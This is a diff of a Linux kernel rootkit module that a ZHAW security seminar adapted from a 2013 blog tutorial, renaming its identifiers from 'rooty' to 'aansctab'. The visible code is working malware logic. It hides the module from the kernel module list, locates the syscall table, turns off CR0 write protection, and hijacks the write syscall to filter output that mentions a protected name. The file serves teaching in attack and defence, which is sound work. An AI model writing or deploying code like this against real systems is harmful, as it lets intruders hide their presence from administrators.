@@ -1,3 +1,15 @@
+/*
+ * Linux Rootkita 1/3
+ * By Tyler Borland (TurboBorland)
+ * http://turbochaos.blogspot.ch/2013/09/linux-rootkits-101-1-of-3.html?_escaped_fragment_#!
+ *
+ * Modified by
+ * Cristoffel Gehring 
+ * for
+ * Seminar Angriffe Abwehr Netzwerke, ZHAW
+ * June 2014
+ *
+ */
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
@@ -9,10 +21,10 @@
 
 MODULE_LICENSE("GPL");
 
-int rooty_init(void);
-void rooty_exit(void);
-module_init(rooty_init);
-module_exit(rooty_exit);
+int aansctab_init(void);
+void aansctab_exit(void);
+module_init(aansctab_init);
+module_exit(aansctab_exit);
 
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
@@ -40,9 +52,9 @@ psize **find(void) {
   return NULL;
 }
 
-asmlinkage ssize_t rooty_write(int fd, const char __user *buff, ssize_t count) {
+asmlinkage ssize_t aansctab_write(int fd, const char __user *buff, ssize_t count) {
   int r;
-  char *proc_protect = ".rooty";
+  char *proc_protect = ".aansctab";
   char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
   copy_from_user(kbuff,buff,255);
   if (strstr(kbuff,proc_protect)) {
@@ -54,23 +66,23 @@ asmlinkage ssize_t rooty_write(int fd, const char __user *buff, ssize_t count) {
   return r;
 }
 
-int rooty_init(void) {
+int aansctab_init(void) {
   /* Do kernel module hiding*/
   list_del_init(&__this_module.list);
   kobject_del(&THIS_MODULE->mkobj.kobj);
 
   /* Find the sys_call_table address in kernel memory */
   if ((sys_call_table = (psize *) find())) {
-    printk("rooty: sys_call_table found at %p\n", sys_call_table);
+    printk("aansctab: sys_call_table found at %p\n", sys_call_table);
   } else {
-    printk("rooty: sys_call_table not found, aborting\n");
+    printk("aansctab: sys_call_table not found, aborting\n");
   }
 
   /* disable write protect on page in cr0 */
   write_cr0(read_cr0() & (~ 0x10000));
 
   /* hijack functions */
-  o_write = (void *) xchg(&sys_call_table[__NR_write],rooty_write);
+  o_write = (void *) xchg(&sys_call_table[__NR_write],aansctab_write);
 
   /* return sys_call_table to WP */
   write_cr0(read_cr0() | 0x10000);
@@ -78,9 +90,9 @@ int rooty_init(void) {
   return 0;
 }
 
-void rooty_exit(void) {
+void aansctab_exit(void) {
   write_cr0(read_cr0() & (~ 0x10000));
   xchg(&sys_call_table[__NR_write],o_write);
   write_cr0(read_cr0() | 0x10000);
-  printk("rooty: Module unloaded\n");
+  printk("aansctab: Module unloaded\n");
 }
